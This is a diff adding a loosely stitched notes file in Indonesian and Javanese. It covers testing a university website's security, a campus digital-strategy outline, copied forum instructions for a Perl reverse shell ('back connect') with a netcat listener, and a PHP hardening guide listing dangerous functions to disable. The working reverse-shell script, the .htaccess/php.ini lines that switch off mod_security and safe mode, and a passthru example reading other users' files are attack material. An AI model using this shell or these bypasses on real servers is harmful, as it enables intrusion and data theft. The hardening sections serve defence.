@@ -1,0 +1,219 @@
+reverse ip domain check rung eneng pksi
+cara biar tidak bisa di jump 
+
+pencarian direktori yang writable
+oleh semua user
+proteksi direktori 
+
+
+
+cara biar tidak bisa di back connect dan bind
+fungsi2 exec yang seharusnya di matikan
+fungsi safe mode
+
+script upload tanpa filter
+dijajal di local ae... ng pksi website
+
+jajal patch lfi bisa bener apa ga?
+jajallocal
+
+
+jajal exploti lagi dengan exploit sik mbiyen
+
+
+visi misi
+
+visi
+
+Mewujudkan UIN Sunan Kalijaga Yogyakarta sebagai universitas digital (cyber campus)
+
+Strategi
+1. Otomasi proses administrasi (Akademik, Kemahasiswaan, dan Umum)
+2. Digital lifestyle experience (e-learning, digital information dissemination, dan digital payment)
+
+Prinsip
+Layanan
+	One Day Service
+	One Stop Service
+	3S (Senyum, Salam, Sapa)
+	
+Teknis
+	One Account for All Access
+	One Entry for All Database
+	ADAP (As Digital As Posible)
+
+analisis tempat
+
+daftar pustaka
+
+netcat sik bener di replace
+
+
+
+back connect
+
+Kalau dithread sebelumnya bindshell adalah melakukan koneksi ke server korban dengan membuka port diserver. Maka backconnect beda. ingin tau kelanjutannya simak thread berikut.
+
+Apa itu backconnect ?
+Backconnect biasanya digunakan untuk server yg tertutup proxy atau firewall. sehingga tidak bisa di lakukan remote connect. Jadi salah satu triknya adalah membalik koneksi, yaitu mengkoneksikan dari server ke komputer kita.
+
+Apa perbedaannya sama bindshell ?
+bedanya, kalo backconnect adalah melakukan koneksi balik dari shell, ke komputer kita, jadi dikomputer kita diset Listening port.
+
+Bagaimana cara penggunaannya ?
+cara penggunanya hampir sama dengan bindshell cuma dibalik.
+
+* BackConnect Lewat Shell
+Yang harus dilakukan terlebih dahulu adalah upload script backconnectnya. disini saya menggunakan script perl untuk backconnect punyanya om ArRay.
+
+1. Set mode listening dulu dinetcat anda:
+
+ex: nc -vlp portnya
+jadi: nc -vlp 13123
+
+akan muncul tulisan: listening on [any] 13123 ...
+
+2. Setelah itu upload script bindshell.pl nya dishell anda. kemudian ubah permissionnya menjadi 777. chmod 777 bindshell.pl
+
+3. Jalankan perintah berikut dishell:
+
+ex: perl bindshell.pl [ip_anda] [port]
+jadi: perl bindshell.pl 192.168.202.4 13123
+
+tunggulah beberapa saat, jika sudah connect ke kompi anda. maka selamat anda berhasil melakukan back-connect.
+
+Script bindshell.pl nya:
+Code:
+#!/usr/bin/perl
+use Socket;
+$cmd= "lynx";
+$system= 'echo "`uname -a`";echo "`id`";/bin/sh';
+$0=$cmd;
+$target=$ARGV[0];
+$port=$ARGV[1];
+$iaddr=inet_aton($target) || die("Error: $!\n");
+$paddr=sockaddr_in($port, $iaddr) || die("Error: $!\n");
+$proto=getprotobyname('tcp');
+socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
+connect(SOCKET, $paddr) || die("Error: $!\n");
+open(STDIN, ">&SOCKET");
+open(STDOUT, ">&SOCKET");
+open(STDERR, ">&SOCKET");
+system($system);
+close(STDIN);
+close(STDOUT);
+close(STDERR);
+* Kendala yang sering terjadi yang mengakibatkan tidak bisa backconnect ke Kompie
+Jadi begini ceritanya. misalkan anda sudah melakukan back-connect dengan berbagai cara tidak ada yang berhasil. maka kemungkinan kendala yang terjadi adalah sang admin/empunya server menutup fungsi Listening. (lock) jadi, dapat mengakibatkan gagal koneksi balik ke komputer kita. sehingga mendapatkan error connection refused/NOTSOCK dinetca
+
+
+
+
+
+
+
+
+
+PHP Shell adalah sebuah shell selayaknya shell dalam linux dan Command Prompt dalam windows, hanya saja shell ini dibungkus atau dibundel dalam Script PHP. Dengan php shell, anda dapat menjalankan hampir semua perintah shell dengan menggunakan browser sebagai media consolenya. Untuk Menjalankan php shell ini, kita hanya membutuhkan file php shell dan sebuah browser. Tentunya file phpshell telah tertanam didalam server anda.
+
+
+
+PhpShell tentu sangat berguna bagi seorang administrator dalam memelihara server yang mereka punya. Tetapi bagaimana jika ada penyusup dan menanam file php shell di server anda? sang penyusup bukan hanya bisa melihat semua isi dari server tersebut, tetapi dia mampu untuk menambah bahkan mengurangi data yang ada di server tersebut. Atau bisa saja sang punyusup menggunakan server anda sebagai media penyimpanan file-file berbahaya, seperti file mp3, video, dll. Menjadikan server anda sebagai kambing hitam dalam melakukan kejahatan di Internet. Tentunya hal ini sangat berbahaya bagi kelangsungan server tersebut.
+
+Salah satu cara untuk mencegah hal tersebut adalah dengan membatasi atau mematikan fungsi PHP yang tidak berguna dan dianggap berbahaya. Dengan membatasi fungsi PHP ini, php shell tidak akan dapat berjalan dengan sempurna.
+
+Untuk disable fungsi php shell, anda harus memiliki akses ke file php.ini.
+
+Buka file php.ini “untuk linux biasanya lokasi php.ini di /etc/php.ini”
+Cari fungsi “disable_functions“
+Tambahan kode berikut :
+disable_functions = “shell_exec, passthru, proc_open, proc_close, proc_get-status, proc_nice, proc_terminate, exec, system, suexec, popen, pclose, dl, ini_set, virtual, set_time_limit”.
+Kemudian Restart Service Apache atau httpd
+
+
+
+
+
+
+Lanjut ke bagian berikutnya, pada artikel sebelumnya telah dibahas sedikit tentang beberapa hal yang dapat dilakukan untuk mengamankan Apache Web Server. Pada bagian ini akan dibahas mengenai beberapa hal yang dapat kita lakukan untuk memperkuat web server kita dengan cara mengutak-atik konfigurasi PHP. Berikut ini adalah hal-hal yang dapat kita lakukan :
+
+Disable Functions
+
+Beberapa fungsi di PHP sangat berbahaya apabila digunakan tidak hati-hati. Salah satu contohnya adalah fungsi system() yang dapat digunakan untuk mengeksekusi shell command dari kode PHP anda. Kemudian ada juga fungsi ini_set() yang dapat mengubah konfigurasi php.ini melalui kode PHP yang ada. Fungsi-fungsi seperti ini akan lebih baik jika dinon-aktifkan saja apabila memang tidak ada aplikasi web anda yang menggunakannya. Untuk itulah ada option disable_functions di php.ini. Option ini akan men-disable semua fungsi yang disebutkan di dalamnya. Sehingga jika ada kode PHP yang menggunakan fungsi tersebut, kode tersebut tidak akan berjalan.
+
+Contoh isi disable_functions yang disarankan (setiap nama fungsi dipisahkan dengan tanda koma), dapat ditambahi, dapat juga dikurang sesuai kebutuhan, dapat dilihat di sini
+
+Sebetulnya ada 2 fungsi lagi yang bisa di-disable, yaitu base64_decode dan mysql_pconnect. Untuk mysql_pconnect ini masih tidak terlalu berbahaya jika digunakan. Hanya saja jika digunakan secara sembarangan dapat menghabiskan resource server yang cukup besar untuk menyimpan persistent connection.
+
+Sedangkan base64_decode, biasanya digunakan untuk menyembunyikan kode-kode PHP yang berbahaya dalam bentuk base64, sehingga tidak dapat terdeteksi oleh antivirus atau secara manual. Biasanya fungsi ini akan dipanggil di dalam fungsi eval(). Meskipun begitu, beberapa CMS (moodle), PHP Framework (CodeIgniter), dan PHPMyAdmin menggunakan fungsi ini juga. Jadi jika di-disable, kemungkinan besar, fungsionalitas dari aplikasi-aplikasi tersebut akan terganggu. Karena itu, di bawah ini akan dijelaskan bagaimana agar script-script berbahaya yang bersembunyi dengan base64_decode dapat dicegah.
+
+Disable Eval() Function
+
+Eval adalah sebuah fungsi yang dapat digunakan untuk menjalankan script PHP yang ada di dalam parameter fungsi eval tersebut. Hal ini sangat berbahaya, karena bisa saja fungsi yang dijalankan di dalam eval() adalah fungsi-fungsi untuk meretas sistem kita. Karena itu, fungsi eval ini harus di-disable atau minimal dibatasi kemampuannya.
+
+Option disable_functions tidak dapat mencegah fungsi eval() untuk berjalan, cara lain untuk men-disable eval() adalah dengan menggunakan patch suhosin untuk php. Kelebihan patch ini adalah tidak perlu mengompile ulang php untuk menjalankannya. Di beberapa distro seperti ubuntu, debian, dan fedora, patch ini sudah ada di repository. Jadi kita tinggal install saja di server dengan menggunakan apt-get atau synaptic atau yum. Paketnya biasanya bernama php5-suhosin. Setelah paket ini terinstall, buka file /etc/php5/apache2/conf.d/suhosin.ini (mungkin berbeda untuk distro selain Ubuntu dan Debian).
+
+Kemudian pastikan baris ini aktif (tidak dianggap sebagai komentar) di file tersebut :
+
+extension=suhosin.so
+
+Setelah itu cari 3 baris ini :
+
+suhosin.executor.eval.whitelist =
+suhosin.executor.eval.blacklist =
+suhosin.executor.disable_eval = off
+ 
+
+
+Baris whitelist digunakan untuk menentukan fungsi-fungsi apa saja yang boleh dieksekusi oleh fungsi eval. Sedangkan blacklist menentukan fungsi-fungsi apa saja yang tidak boleh dijalankan oleh fungsi eval. Apabila kita ingin men-disable eval secara keseluruhan, maka kita harus merubah parameter suhosin.executor.disable_eval menjadi on. Akan tetapi beberapa CMS juga ada yang memanfaatkan fungsi eval ini. Karena itu, kita bisa memanfaatkan blacklist saja untuk mencegah beberapa fungsi berjalan di dalam eval. Isi dari blacklist dapat diisi sama dengan disable_functions tadi, atau cukup ditambahkan fungsi-fungsi tertentu yang tidak boleh berjalan di dalam eval, seperti base64_decode.
+
+Di bagian sebelumnya base64_decode tidak dimasukkan ke disable_function, karena masih banyak yang menggunakannya. Tetapi aplikasi web biasa, jarang menggunakan base64_decode di dalam eval. Biasanya yang seperti itu hanya para pembuat theme CMS yang ingin menyembunyikan kode untuk menampilkan copyrightnya. Oleh karena itu, base64_decode ini didaftarkan saja di blacklist suhosin agar dia tidak berjalan apabila berada di dalam fungsi eval.
+
+Sementara sekian dulu beberapa tips untuk memperkuat pertahanan server web kita, barangkali ada yang kurang atau salah, silahkan dimasukkan ke dalam kolom komentar yang tersedia di bawah.
+
+
+
+
+
+
+hati2 file php.ini juga bisa di modifikasi
+
+
+
+.htaccess
+++++++++++++++++
+<="" p=""> 
+SecFilterEngine Off
+SecFilterScanPOST Off 
+++++++++++++++++
+
+ini.php
+++++++++++++++++
+
+++++++++++++++++
+
+
+php.ini
+++++++++++++++++
+safe_mode = off
+exec = On
+shell_exec = On
+++++++++++++++++
+
+
+
+kegunaan safe mode
+
+Konfigurasi PHP pada lingkungan web hosting sudah biasa menjadi masalah. Hampir semua perusahaan web hosting mengkonfigurasikan PHP dalam bentuk module Apache. Konfigurasi ini memiliki masalah tergantung dari apakah safe mode dinyalakan atau tidak.
+
+Tanpa safe mode, PHP sangatlah tidak aman. Seorang pengguna di sebuah sistem dapat melihat atau mendownload file miliki pengguna lain pada sistem yang sama. Kode PHP seperti <? passthru("cat /home/otheruser/file"); ?> akan dapat digunakan untuk melihat isi dari file-file milik pengguna lain, termasuk yang bersifat sensitif misalnya yang mengandung password database, nomor kartu kredit atau informasi lainnya.
+Dengan safe mode, PHP sangatlah tidak fleksibel. Anda tidak akan dapat menggunakan sebagian besar program pihak ketiga karena safe mode akan menonaktifkan sebagian fungsi dari PHP. Seluruh program yang memerlukan penulisan atau pembacaan file sama sekali tidak akan berfungsi sama sekali
+
+
+fungsi yang di matikan ketika safe mode
+
+http://php.net/manual/en/features.safe-mode.functions.php
+
+yang ngeksekusi bind barah kui exec ng shell yo..dadi di shell_exec("perl" /dhajda/sadas.pl var var var)
+
+
